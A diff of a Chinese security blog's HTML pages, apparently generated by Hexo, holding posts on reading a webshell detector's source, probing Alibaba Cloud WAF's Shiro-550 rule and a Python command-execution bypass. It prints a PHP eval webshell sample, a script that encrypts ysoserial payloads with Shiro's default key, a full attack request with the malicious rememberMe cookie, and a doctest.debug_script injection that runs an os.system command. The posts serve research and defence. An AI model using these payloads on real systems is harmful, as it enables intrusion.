+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:512,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:256,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;name&quot;:&quot;_POST&quot;&#125;&#125;,&quot;dim&quot;:0&#125;&#125;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201109_7cf149be_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<p>对应的”操作序列”如下：</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201126_9af5fb47_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
+<p>可以看出来，”操作序列”包含了”抽象语法树”两层之间的联系。</p>
+</li>
+</ul>
+<h2 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h2><ul>
+<li><p>怎么生成”抽象语法树”？</p>
+<p>代码在 tool/webshell-detector/php 目录。</p>
+<p>流程如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 在cloudwalker启动时，[php.c](https:&#x2F;&#x2F;github.com&#x2F;leveryd&#x2F;cloudwalker-source-read&#x2F;blob&#x2F;master&#x2F;tool&#x2F;webshell-detector&#x2F;php&#x2F;php.c)新建子线程，并等待输入。</span><br><span class="line">* 子线程接收php代码后，解析生成&quot;抽象语法树&quot;，将结果返回给主线程。子线程通过管道与主线程通信。</span><br></pre></td></tr></table></figure>
+
+<p>解析能力基于<a target="_blank" rel="noopener" href="https://github.com/nikic/php-ast">php-ast项目</a>，业务逻辑可以见<a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/php/payload/index.php">index.php</a></p>
+<p>可以运行index.php做一点简单的测试：输入包括”字符串长度”和”代码”，输出ast字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  php git:(master) ✗ .&#x2F;bin&#x2F;php payload&#x2F;index.php</span><br><span class="line">26</span><br><span class="line">&lt;?php eval(&#39;$_POST[0]&#39;);?&gt;</span><br><span class="line">142</span><br><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&quot;$_POST[0]&quot;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/">仓库</a>中放了我阅读代码时的注释，方便有需要的读者。</p>
+<p>从测试效果来看，开源版本和目前线上版本有很大差异：开源版本cloudwalker比较容易绕过，<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">线上</a>则难度大很多。</p>
+<p><img src="https://images.gitee.com/uploads/images/2021/1027/201155_7f9c8ee0_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
 
       
     </div>
@@ -934,7 +862,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -947,7 +875,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
+          <a href="/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
         </h2>
 
         <div class="post-meta-container">
@@ -971,27 +899,45 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
-<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>shiro-550漏洞利用时，payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码。</p>
+<p>也有人整理出常见的aes加密密钥 top100 来利用此漏洞。</p>
+<p>如果要在waf中对这个漏洞利用做防护，我能想到的安全策略是：</p>
+<ol>
+<li>根据cookie中的rememberMe的值是否过长、是否符合aes加密特征等 来拦截</li>
+<li>先base64解码，然后aes解密，最后规则匹配原始payload</li>
+</ol>
+<p>第二个方法存在两个问题：</p>
+<ol>
+<li><p>aes解密时密钥是啥？会把top100利用时的密钥全部覆盖？</p>
+</li>
+<li><p>这个方法想起来简单，但是实施起来并不简单。它需要规则引擎支持base64解码和aes解密，并且需要规则中能够很容易描述这个解码顺序。</p>
+<p> 按照我的理解，waf和poc扫描的规则引擎类似，都支持规则描述文件和代码实现方式两种。如果waf规则引擎只支持规则描述文件的形式，不支持用代码来描述防护规则，那写这么一条规则我觉得还挺费劲的。</p>
+</li>
+</ol>
+<p>下面就是我验证阿里云waf是怎么拦截防护shiro-550漏洞的。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>测试payload使用下面脚本生成，其中key使用shiro-550默认key</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Python2</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">BS &#x3D; AES.block_size</span><br><span class="line">mode &#x3D; AES.MODE_CBC</span><br><span class="line">iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad(s): return s + ((BS - len(s) % BS)</span><br><span class="line">                    * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_shiro_payload(rememberMe):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	打印 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;&quot; 生成的payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	# rememberMe &#x3D; &quot;&quot;&quot;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxq&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">	data &#x3D; encryptor.decrypt(base64.b64decode(rememberMe))</span><br><span class="line">	print(data)</span><br><span class="line">	print(len(data))</span><br><span class="line"></span><br><span class="line">def encrypt_shiro_payload(originalPayload):</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	originalPayload 是 java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS &quot;http:&#x2F;&#x2F;xxx&quot; 生成的payload</span><br><span class="line"></span><br><span class="line">	打印payload</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	data &#x3D; base64.b64encode(encryptor.encrypt(pad(originalPayload)))</span><br><span class="line">	print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	encrypt_shiro_payload(&quot;111111&quot;*400)</span><br></pre></td></tr></table></figure>
 
-<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
-<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
-<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
-<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
-
-<p>结果测出很多函数都可以正常运行，没有报错。</p>
-<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
-<p>测试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
-
-<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
-<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
+<ol>
+<li><p>测试攻击请求</p>
+<p> 原始payload是利用ysoerial工具生成： java8 -jar scripts/third_party/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar URLDNS “”</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密→base64编码</p>
+<p> 发送请求后，阿里云waf拦截</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxxx.com</span><br><span class="line">User-Agent: curl&#x2F;7.70.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: rememberMe&#x3D;x4xXLguUTO+o2zDz6PKJtR7VQfrG08LE5KTMlw3cViQACMqKZ34wqnB1PIYeWTyiLrx2Dp7Gw3cFHJzwBUdqJXnSWmG7&#x2F;SC7EH6c6OgPNTCgiplznhs61pwsoFU6X9NTHZi+&#x2F;xr2Jo3rh&#x2F;TW1gPqK6y4UGW9nqT6UDFybJLqO4bb7DhNsMkVNB4sZ7SgE1ee4zhY591SECQEDDzkM0EHbc2drf92hgueAEK450IqjUI03s1hq838mziWdE7OtQPQ6CjldBKPrSZ0BNhOGP+epg5SrLpXAjj&#x2F;iwLVCRFE0lIUFtNDc9m8h5JKg&#x2F;SLwa&#x2F;yNTWZ+5DAooRs4+&#x2F;yy1Z6xIe7d+OunTmTMnNXACNthKd96Y8RA4q9TnnS4aV91HbMoo&#x2F;Voy&#x2F;v03expiCm2OBpv72oTUCtV9eoHBByXyUsBDUI9BtN1IfAwjkFYj6fa4w5nAuR4sgbBrVy1KYnbgVN1H3DZ5Lmt8tvz1uhxo+SIQLtJfqhY1NhW10bWNm3F+sSyG7xblEDVgBLWer7ayRwZlv7&#x2F;LejK1NPsjVPd8MvBTHfBMShNaQmS7LRTQssGaxp</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试正常请求</p>
+<p> 原始payload是 “111111”*400 ，不包含攻击特征。</p>
+<p> payload在cookie中的rememberMe中，生成过程：原始payload-&gt;aes加密-&gt;base64编码</p>
+<p> 结论：正常请求阿里云waf未拦截</p>
+</li>
+</ol>
+<p>对比拦截和不拦截的情况，可以看出来阿里云waf防护防护规则逻辑：先对cookie中的rememberMe做base64解码，然后用默认key(kPH+bIxk5D2deZiIxcaaaA==”) 来做aes解密，最后规则匹配解密后的内容。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有一些测试在分析过程中没有写，这里直接写出结论：</p>
+<ol>
+<li>阿里云waf仅尝试使用一个默认key来解密。（应该是性能考虑）</li>
+<li>不能根据rememberMe的值过长来拦截，因为正常业务这个值也可能有500+个字节长度。</li>
+</ol>
+<p>虽然不能完全防御shiro-100key扫描，但是阿里云waf这条规则还是挺细致的。从支持rsa解密这一点上感觉背后的规则引擎功能很丰富。</p>
 
       
     </div>
@@ -1188,6 +1134,90 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
+<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
+
+<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
+<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
+<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
+<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+
+<p>结果测出很多函数都可以正常运行，没有报错。</p>
+<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
+<p>测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
+
+<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
